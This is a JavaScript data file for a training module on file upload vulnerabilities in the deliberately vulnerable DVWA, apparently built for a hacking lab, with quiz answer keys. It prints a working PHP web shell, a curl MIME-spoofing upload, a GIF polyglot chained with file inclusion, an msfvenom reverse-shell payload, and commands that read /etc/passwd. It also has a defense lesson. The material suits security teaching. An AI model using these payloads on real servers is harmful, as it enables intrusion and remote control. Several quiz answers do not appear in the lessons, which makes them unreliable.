const LESSONS = [
  {
    title: "1. Start Here — Set Up the Lab",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_setup_nologo_1779677372368.png" alt="Lab Setup"></div>
      <h3>Lab Environment Setup</h3>
      <p>Before demonstrating a file upload vulnerability, the target environment and the attack environment must be properly configured. This lab utilizes a containerized instance of Damn Vulnerable Web Application (DVWA) as the target and a Kali Linux container as the attack machine.</p>
      <p>Imagine preparing for a stage play. Before the actors can perform, the stage crew must turn on the lights, set up the props, and make sure the curtains are ready. In this lab, we are the stage crew setting up both the target website (the stage) and our hacking tools (the props) so we can practice our security tests safely.</p>
      <h3>Goal: Get both machines running and log into DVWA</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Launch DVWA (Your Target)</strong><br>Click the button: [Open DVWA Target ⇗] to open a new tab with DVWA. If it fails, wait 10 seconds and refresh.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Set Up the DVWA Database</strong><br>In the DVWA tab, click "Setup / Reset DB" on the left menu. Click the [Create / Reset Database] button and wait for the success message.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Log Into DVWA</strong><br>Log in with Username: <code>admin</code> and Password: <code>password</code>.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 4</div>
        <div class="step-body"><strong>Set Security Level to LOW</strong><br>Go to "DVWA Security", change the level to "Low", and click [Submit].</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 5</div>
        <div class="step-body"><strong>Launch Kali (Your Attack Machine)</strong><br>Click [Start Kali Container ⇗]. Copy the provided command and paste it into YOUR local terminal to get a Kali shell.</div>
      </div>`,
    questions: [
      { q: "What username do you use to log into DVWA?", a: "admin", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What security level must DVWA be set to for Lesson 4 (basic upload)?", a: "low", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "After clicking 'Create / Reset Database', what should you see?", a: "success", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "2. What is a File Upload Vulnerability?",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_concept_nologo_1779677390166.png" alt="File Upload Concept"></div>
      <h3>File Upload Vulnerability</h3>
      <p>A file upload vulnerability occurs when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. This can allow an attacker to upload an executable script (a web shell) which can then be executed on the server, leading to Remote Code Execution (RCE).</p>
      <p>Imagine a fancy art gallery with a drop-box for people to donate paintings. Normal people drop in beautiful paintings. The gallery owner blindly grabs whatever is in the box and hangs it on the wall. But what if a sneaky thief drops a noisy, destructive robot into the box instead? Because the owner doesn't check, they put the robot on the wall, and it destroys the gallery! A File Upload Vulnerability is exactly like this. The website asks for a profile picture, but an attacker uploads a dangerous mini-program. When the website saves and runs it, the attacker takes control!</p>
      <h3>Attack Execution Flow</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Create Payload</strong><br>The attacker writes a small script (a "Web Shell") that acts like a command prompt for the server.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Upload File</strong><br>The attacker uploads the script through a normal upload form (like an avatar upload).</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Server Storage</strong><br>The server saves the script in its public folders (e.g., the Webroot).</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 4</div>
        <div class="step-body"><strong>Trigger Execution</strong><br>The attacker opens their browser and navigates to the URL of the uploaded file to execute it and gain Remote Code Execution (RCE).</div>
      </div>`,
    questions: [
      { q: "What is it called when an attacker runs code on a remote server?", a: "Remote Code Execution", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What do we call a PHP script uploaded to run OS commands via a URL?", a: "web shell", hint: "Check the command reference blocks." },
      { q: "In DVWA, what is the name of the folder where uploaded files are stored?", a: "hackable/uploads", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "3. Linux Commands You Will Use",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_commands_nologo_1779677405894.png" alt="Linux Commands"></div>
      <h3>Post-Exploitation Commands</h3>
      <p>After successfully executing a web shell, attackers utilize standard operating system commands to perform local reconnaissance, escalate privileges, and extract sensitive data from the underlying Linux environment.</p>
      <p>Imagine you just sneaked into the control room of a giant submarine. You don't know who is driving, where you are, or what buttons do what. To figure it out, you read the manuals and check the gauges. In Linux, after we hack the server, we use special commands to check the gauges: "whoami" tells us our name, "pwd" tells us where we are standing, and "ls" shows us all the files in the room!</p>
      <h3>Essential Commands</h3>
      <div class="step-block">
        <div class="step-num">Cmd 1</div>
        <div class="step-body"><strong>whoami</strong><br>Shows which user the web server is running as (usually <code>www-data</code>).</div>
      </div>
      <div class="step-block">
        <div class="step-num">Cmd 2</div>
        <div class="step-body"><strong>id</strong><br>Shows user ID, group ID, and all group memberships.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Cmd 3</div>
        <div class="step-body"><strong>ls</strong><br>Lists all files and directories in the current folder.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Cmd 4</div>
        <div class="step-body"><strong>pwd</strong><br>Prints the Working Directory (shows exactly what folder you are currently in).</div>
      </div>
      <div class="step-block">
        <div class="step-num">Cmd 5</div>
        <div class="step-body"><strong>cat</strong><br>Reads and prints the contents of a file (e.g., <code>cat /etc/passwd</code>). Note: Use <code>+</code> instead of spaces in URLs (e.g., <code>?cmd=cat+/etc/passwd</code>).</div>
      </div>`,
    questions: [
      { q: "Which command shows what OS user the web server is running as?", a: "whoami", hint: "Check the command reference blocks." },
      { q: "Which command lists files in the current directory?", a: "ls", hint: "Check the command reference blocks." },
      { q: "In a URL, what character replaces a space in the cmd parameter?", a: "+", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "4. DVWA Low — Upload Your First Shell",
    points: 20,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_low_nologo_1779677421616.png" alt="DVWA Low Security"></div>
      <h3>Unrestricted File Upload</h3>
      <p>An unrestricted file upload vulnerability exists when an application accepts files without performing any validation on the file's type, extension, or contents. This permits the direct upload and execution of a malicious payload, such as a PHP web shell.</p>
      <p>On Low security, DVWA is like an art gallery with a security guard who is fast asleep. The website asks for a picture, but it accepts absolutely ANY file you give it. It doesn't check if it is a painting, a document, or a dangerous robot. We are going to build a tiny, dangerous PHP robot called a "Web Shell" and upload it straight past the sleeping guard to take over!</p>
      <h3>Practical Attack Walkthrough</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Create the Shell</strong><br>In your Kali terminal, write a PHP shell using <code>shell_exec()</code>:
        <pre><code>cat &gt; shell.php &lt;&lt; 'EOF'
&lt;?php
if(isset($_REQUEST['cmd'])){
  echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;";
}
?&gt;
EOF</code></pre>
        </div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Upload</strong><br>Go to DVWA "File Upload". Select your <code>shell.php</code> and upload it. Look for the success path.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Execute</strong><br>Visit the uploaded file in your browser to run a command: <code>http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=whoami</code>.</div>
      </div>`,
    questions: [
      { q: "What PHP function runs an OS command and returns its output?", a: "shell_exec", hint: "Check the command reference blocks." },
      { q: "After uploading shell.php on Low, which folder is it saved in?", a: "hackable/uploads", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What URL parameter sends commands to the web shell?", a: "cmd", hint: "Check the command reference blocks." }
    ]
  },
  {
    title: "5. How Servers Check Files (MIME & Magic Bytes)",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_filters_nologo_1779677438330.png" alt="File Type Filters"></div>
      <h3>File Validation Mechanisms</h3>
      <p>Web applications use various methods to validate uploaded files, including checking the HTTP Content-Type header (MIME type), verifying the file extension, or inspecting the file's magic bytes (file signature) to confirm its actual format.</p>
      <p>When the security guards wake up, they use three tricks to check files. First, they read the sticky note attached to the file (the MIME Type). Second, they look at the last letters of the filename (the extension). Third, the smartest guards actually open the file and look at the first drop of ink inside it (the Magic Bytes)! Knowing exactly which trick the guard uses is the secret to sneaking past them.</p>
      <h3>Validation Methods</h3>
      <div class="step-block">
        <div class="step-num">Method 1</div>
        <div class="step-body"><strong>MIME Type Header</strong><br>Checks the <code>Content-Type: image/jpeg</code> header sent by the browser. This is easily faked by an attacker.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Method 2</div>
        <div class="step-body"><strong>File Extension</strong><br>Checks the filename (e.g., <code>.php</code> vs <code>.jpg</code>). Bypassed using alternate extensions like <code>.phtml</code> or null bytes.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Method 3</div>
        <div class="step-body"><strong>Magic Bytes</strong><br>Reads the file's internal header. A GIF always starts with <code>GIF89a</code>. Bypassed by prepending these bytes to a PHP payload (a Polyglot).</div>
      </div>`,
    questions: [
      { q: "What HTTP header tells the server what type of file is being uploaded?", a: "Content-Type", hint: "Refer to the HTTP protocol details." },
      { q: "What 6 characters do you prepend to trick getimagesize() into thinking a file is a GIF?", a: "GIF89a", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What are the specific bytes at the start of a file that identify its real type called?", a: "magic bytes", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "6. DVWA Medium — Bypass the MIME Check",
    points: 20,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_medium_nologo_1779677455707.png" alt="DVWA Medium Security"></div>
      <h3>MIME Type Spoofing</h3>
      <p>Applications often incorrectly trust the <code>Content-Type</code> header supplied by the client in a multi-part POST request. An attacker can use proxy tools or command-line utilities (like cURL) to forge this header, declaring a malicious PHP script as a benign <code>image/jpeg</code> to bypass validation.</p>
      <p>On Medium security, the guard checks the sticky note on your file. If it doesn't say "image", they throw it away. If you hand them your PHP robot, they reject it. But here is the trick: YOU write the sticky note! We will take our dangerous PHP robot, slap a sticky note on it that says "I am totally a harmless JPEG picture!", and hand it to the guard. The lazy guard believes the lie!</p>
      <h3>Practical Attack Walkthrough</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Set Level</strong><br>Change DVWA Security to "Medium". Get your <code>PHPSESSID</code> cookie value from the browser's Developer Tools (Storage/Cookies).</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Spoof MIME with cURL</strong><br>In your Kali terminal, run cURL to upload the file while faking the type:
        <pre><code>curl -b "security=medium; PHPSESSID=YOUR_COOKIE" \
  -F "uploaded=@shell.php; type=image/jpeg" \
  -F "Upload=Upload" \
  http://[DVWA-IP]/dvwa/vulnerabilities/upload/</code></pre></div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Execute</strong><br>The file is saved as <code>shell.php</code>. Visit it in the browser with <code>?cmd=id</code> to execute commands.</div>
      </div>`,
    questions: [
      { q: "What is it called when you fake the Content-Type header to bypass file type checks?", a: "MIME spoofing", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "In the curl command, which part sets the fake MIME type?", a: "type=image/jpeg", hint: "Check the command reference blocks." },
      { q: "Where do you find your PHPSESSID cookie value?", a: "developer tools", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "7. DVWA High — Bypass Magic Byte Check",
    points: 20,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_high_nologo_1779677473626.png" alt="DVWA High Security"></div>
      <h3>Polyglot Files and Vulnerability Chaining</h3>
      <p>High security employs <code>getimagesize()</code> to validate magic bytes and enforces a strict extension whitelist. Bypassing this requires creating a polyglot payload (e.g., prepending <code>GIF89a</code> to PHP code) and chaining the upload with a Local File Inclusion (LFI) vulnerability to force the server to parse the <code>.gif</code> extension as executable PHP.</p>
      <p>On High security, the strict bouncer uses a tool to rip open your file and look at the first drop of ink (magic bytes). Faking the sticky note fails. We need a Disguise Suit! We build a "Polyglot" file that wears the mask of a GIF image on the outside, but hides our PHP robot inside. The bouncer sees the GIF ink and lets us in! Then, we use a second trick to force the server to open the disguise.</p>
      <h3>Practical Attack Walkthrough</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Create Polyglot</strong><br>In Kali: <code>printf 'GIF89a&lt;?php system($_GET["cmd"]); ?&gt;' &gt; evil.gif</code></div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Upload</strong><br>Set DVWA to High. Upload <code>evil.gif</code> normally. It passes because of the <code>GIF89a</code> header.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Execute via LFI</strong><br>Because the server won't execute a <code>.gif</code> directly, chain it with File Inclusion. Go to "File Inclusion" and use the file wrapper: <code>?page=file:///var/www/html/dvwa/hackable/uploads/evil.gif&amp;cmd=id</code>.</div>
      </div>`,
    questions: [
      { q: "Which PHP function reads file header bytes to validate if it is a real image?", a: "getimagesize", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What 6-character magic bytes do we put at the start of the file to bypass the image check?", a: "GIF89a", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "Which second DVWA vulnerability do we use to execute the uploaded .gif as PHP?", a: "File Inclusion", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "8. Tool Method — Metasploit Reverse Shell",
    points: 20,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_reverse_shell_nologo_1779677495172.png" alt="Reverse Shell Metasploit"></div>
      <h3>Reverse Shells and Metasploit</h3>
      <p>A reverse shell is a payload that forces the compromised server to initiate an outbound connection back to the attacker's listening machine. This technique is crucial for bypassing inbound firewall rules. The Metasploit Framework is widely used to generate these payloads (via msfvenom) and catch the incoming connections (via multi/handler).</p>
      <p>Instead of you calling the server to run one command at a time, what if the server called YOU and gave you full control? That is a Reverse Shell! You set up a trap (a listener) on your computer, upload the payload, and when the server runs it, it reaches out and connects back to you, bypassing all the firewalls blocking incoming traffic.</p>
      <h3>Practical Attack Walkthrough</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Generate Payload</strong><br>Find your Kali IP (<code>ip a</code>). Run: <code>msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o payload.php</code></div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Start Listener</strong><br>In <code>msfconsole</code>, run: <code>use exploit/multi/handler</code>, set PAYLOAD, LHOST, and LPORT, then type <code>exploit</code>.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Trigger Shell</strong><br>Upload <code>payload.php</code> to DVWA (Low), then visit the URL. Metasploit will catch the incoming Meterpreter session!</div>
      </div>`,
    questions: [
      { q: "What msfvenom flag sets the attacker's listening IP address?", a: "LHOST", hint: "Check the command reference blocks." },
      { q: "What Metasploit module listens for and handles incoming reverse shell connections?", a: "exploit/multi/handler", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What Meterpreter command drops you into a real system bash shell?", a: "shell", hint: "Check the command reference blocks." }
    ]
  },
  {
    title: "9. Defenses — How to Stop These Attacks",
    points: 15,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_defense_nologo_1779677510360.png" alt="Secure Upload Defenses"></div>
      <h3>Mitigating File Upload Vulnerabilities</h3>
      <p>Securing file uploads requires a defense-in-depth approach. Developers must utilize strict extension whitelists, robust server-side validation (like <code>finfo_file</code>), random filename generation, and proper architectural segregation (storing files outside the webroot or disabling execution privileges).</p>
      <p>Now you know how to attack, but you must learn to defend! Fixing this requires multiple layers of security. Don't rely on blacklists (lazy guards), don't trust sticky notes (MIME headers). The ultimate defense is storing the files in a vault OUTSIDE the public gallery (webroot), so even if a destructive robot is uploaded, no one can ever access or trigger it!</p>
      <h3>Defensive Strategies</h3>
      <div class="step-block">
        <div class="step-num">Defense 1</div>
        <div class="step-body"><strong>Whitelist Extensions</strong><br>Never use blacklists. Only allow explicitly defined safe extensions (e.g., <code>jpg</code>, <code>png</code>).</div>
      </div>
      <div class="step-block">
        <div class="step-num">Defense 2</div>
        <div class="step-body"><strong>Validate Content</strong><br>Use <code>finfo_open(FILEINFO_MIME_TYPE)</code> to inspect the actual file contents, bypassing forged headers.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Defense 3</div>
        <div class="step-body"><strong>Isolate Storage</strong><br>Store uploads OUTSIDE the webroot (e.g., <code>/var/uploads</code>) or use <code>.htaccess</code> (<code>php_flag engine off</code>) to disable script execution.</div>
      </div>`,
    questions: [
      { q: "Which PHP function reads actual file bytes to verify the real MIME type?", a: "finfo_file", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What Apache directive in .htaccess stops PHP execution in a directory?", a: "php_flag engine off", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "Why is storing uploads OUTSIDE the webroot the strongest defense?", a: "the file cannot be accessed via URL", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "10. Final Quiz — Prove You Know It!",
    points: 15,
    html: `<div class="htb-diagram-container"><img src="../../../assets/fileupload_quiz_nologo_1779677530414.png" alt="Final Quiz"></div>
      <h3>Comprehensive Review</h3>
      <p>Review the concepts of Remote Code Execution, MIME spoofing, Polyglot payloads, and defensive mechanisms to complete the module.</p>
      <div class="step-block">
        <div class="step-num">Task</div>
        <div class="step-body">Answer all questions below to prove your mastery of file upload vulnerabilities and complete the lab!</div>
      </div>`,
    questions: [
      { q: "What is the one-word term for running attacker-controlled code on a remote server?", a: "RCE", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What 6-character string bypasses getimagesize() on DVWA High?", a: "GIF89a", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What command starts a simple netcat listener on port 4444?", a: "nc -lvkp 4444", hint: "Check the command reference blocks." },
      { q: "What is the technique of using both File Upload AND File Inclusion together called?", a: "LFI upload chain", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "Which curl flag sets the MIME type of the uploaded file (e.g. to image/jpeg)?", a: "type", hint: "Check the command reference blocks." }
    ]
  }
];
